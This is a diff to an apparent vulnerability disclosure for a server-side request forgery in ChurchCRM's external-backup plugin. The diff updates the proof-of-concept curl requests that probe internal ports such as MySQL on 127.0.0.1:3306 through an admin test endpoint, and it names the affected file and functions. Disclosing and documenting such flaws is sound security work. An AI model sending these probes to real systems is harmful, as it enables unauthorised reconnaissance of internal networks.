@@ -46,15 +46,15 @@ curl -s -c cookies.txt -X POST "http://TARGET/churchcrm/session/begin" \
 
 # Probe an open internal port (MySQL 3306)
 curl -s -b cookies.txt -X POST \
-  "http://TARGET/churchcrm/plugins/external-backup/api/test" \
+  "http://TARGET/churchcrm/plugins/api/plugins/external-backup/test" \
   -H "Content-Type: application/json" \
-  -d '{"endpoint":"http://127.0.0.1:3306/","username":"a","password":"b"}'
+  -d '{"settings":{"endpoint":"http://127.0.0.1:3306/","username":"a","password":"b"}}'
 
 # Probe a closed port (9999)
 curl -s -b cookies.txt -X POST \
-  "http://TARGET/churchcrm/plugins/external-backup/api/test" \
+  "http://TARGET/churchcrm/plugins/api/plugins/external-backup/test" \
   -H "Content-Type: application/json" \
-  -d '{"endpoint":"http://127.0.0.1:9999/","username":"a","password":"b"}'
+  -d '{"settings":{"endpoint":"http://127.0.0.1:9999/","username":"a","password":"b"}}'
 ```
 
 **Open port response:**
@@ -71,14 +71,13 @@ The error message difference unambiguously identifies whether a port is open or 
 
 ## Evidence
 
-![Open vs closed port response comparison](assets/poc.png)
-<!-- Add video or additional screenshots to assets/ -->
+![Open vs closed port response comparison](assets/vuln-5-poc.png)
 
 ## Affected Component
 
 | Field | Value |
 |-------|-------|
-| Endpoint | `POST /plugins/external-backup/api/test` |
+| Endpoint | `POST /plugins/api/plugins/external-backup/test` (admin management API) |
 | File | `plugins/core/external-backup/src/ExternalBackupPlugin.php` |
 | Function | `isValidEndpointUrl()`, `performPropfind()` |
 | Auth required | Yes — Admin role |
